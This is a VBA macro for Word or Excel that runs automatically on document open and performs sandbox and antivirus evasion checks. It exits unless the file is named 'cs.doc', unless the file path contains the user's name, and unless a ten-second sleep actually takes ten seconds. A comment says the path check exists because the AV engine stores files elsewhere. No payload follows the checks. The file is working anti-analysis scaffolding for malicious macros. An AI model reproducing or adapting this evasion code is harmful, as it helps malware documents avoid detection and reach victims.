#If VBA7 Then
 Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr) 'For 64 Bit Systems
#Else
 Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds as Long)  'For 32 Bit Systems
#End If

Sub Auto_Open()

    'perform doc name test cs.doc in this case
    ' <> is not equal
    ' if StrComp() is true returns 0

If StrComp(ActiveDocument.Name, "cs.doc", vbTextCompare) <> 0 Then
    Exit Sub
End If

'perform path test
' check if the path has username C:/*/Ted/*
' AV Engine saves the file somewhere else

Dim regexObject As Object
Set regexObject = CreateObject("VBScript.RegExp")

regexObject.Pattern = Application.UserName

If regexObject.Test(ActiveDocument.path) <> True Then
Exit Sub
End If

' perform sleep test
Dim myTime
Dim second_time

Dim Timein As Date
Dim Timeout As Date
Dim subtime As Variant

myTime = Time
Timein = Date + myTime
Sleep 10000
second_time = Time
Timeout = Date + second_time

' if Datediff true=1, false=0
subtime = DateDiff("s", Timein, Timeout)

If subtime <> 10 Then
    Exit Sub
End If


End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
